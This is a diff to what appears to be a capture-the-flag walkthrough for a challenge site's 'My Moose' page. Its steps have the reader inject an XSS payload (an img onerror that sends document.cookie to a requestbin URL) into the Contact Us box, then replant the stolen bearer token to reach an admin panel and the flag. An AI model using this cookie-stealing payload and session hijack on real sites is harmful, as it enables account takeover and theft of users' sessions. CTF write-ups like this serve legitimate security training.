@@ -17,12 +17,17 @@ After creating an account, sign in and go to 'My Moose'.<br>
 Scroll down to the 'Contact Us' section.<br>
 Go to this site in a different tab: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md<br>
 <br>
-Copy the following snippet of code and paste it into the text box in the original site.
-<imgsrc=xonerror=this.src='http://192.168.0.18:8888/?'+document.cookie;><br>
+Copy the following snippet of code and paste it into the text box in the original site. <br>
+For example:
+<img src=x onerror=this.src='https://enqewxf0bhc69.x.pipedream.net/?'+document.cookie;><br>
 
 https://pipedream.com/requestbin<br>
 Create a public bin and paste the link you got into the src of the code above<br>
 Send the message and check for the token in the requested bin<br>
 Go to https://jwt.io/ and translate the Bearer<br>
 Use the 'cookie editor' extension or access the cookies though the 'Application' tab in the 'inspect' of the site.<br>
-Paste the bearer value and save<br>
+Paste the bearer value, save it and refresh the page<br>
+Now you should see a new yellow button next to 'My Moose' that says 'Admin Panel'. <br>
+Now this is the buggy part. Enter the admin panel and you will either see a blank page, or you will see the flag. <br>
+If you don't see the flag, repeat the login part and redo the cookie edit. Repeat until it works
+
